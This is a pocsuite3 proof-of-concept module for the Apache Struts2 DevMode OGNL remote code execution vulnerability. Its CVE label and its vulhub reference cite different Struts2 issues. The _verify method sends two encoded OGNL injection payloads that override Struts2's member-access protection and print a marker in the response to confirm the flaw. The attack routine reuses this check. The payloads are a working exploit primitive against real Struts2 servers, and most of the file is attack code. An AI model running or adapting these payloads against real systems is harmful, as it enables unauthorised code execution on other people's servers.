# -*- coding:utf-8 -*-

from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from urllib.parse import urljoin
from pocsuite3.lib.utils import random_str


class DemoPOC(POCBase):
    vulID = "CVE-2016-4438"
    version ='1'
    author = ["lmx"]
    vulDate = "2016"
    createDate = "2022-2-3"
    updateDate = "2022-2-3"
    references =["https://vulhub.org/#/environments/struts2/s2-016/"]
    name ="S2-DevMode Remote Code Execution Vulnerablity"
    appPowerLink = ''
    appName = 'Strute2'
    appVersion = '2.1.0–2.5.1'
    vulType = 'RCE'
    desc = '''
    Struts2-DevMode远程代码执行漏洞
    '''
    samples = []
    install_requires = ['']

    def _verify(self):
        result ={}
        payload = '''debug=browser&object=%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2c%23res%3d@org.apache.struts2.ServletActionContext@getResponse%28%29%2c%23w%3d%23res.getWriter%28%29%2c%23w.print%28%27web%27%2b%27path888888%27%29%29'''
        payload_2 = '''debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f%23context[%23parameters.rpsobj[0]].getWriter().println(%23parameters.content[0]):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=webpath888'''
        #payload_3 = ''''''
        #url = self.url
        headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Cookie':'SessionId=96F3F15432E0660E0654B1CE240C4C36'
                    }

        r = requests.post(url=self.url,headers=headers,data=payload)
        rr = requests.post(url=self.url,headers=headers,data=payload_2)

        try:
            if 'webpath888888' in r.text or 'webpath888' in rr.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
        except Exception as e:
            pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        return self._verify()
register_poc(DemoPOC)
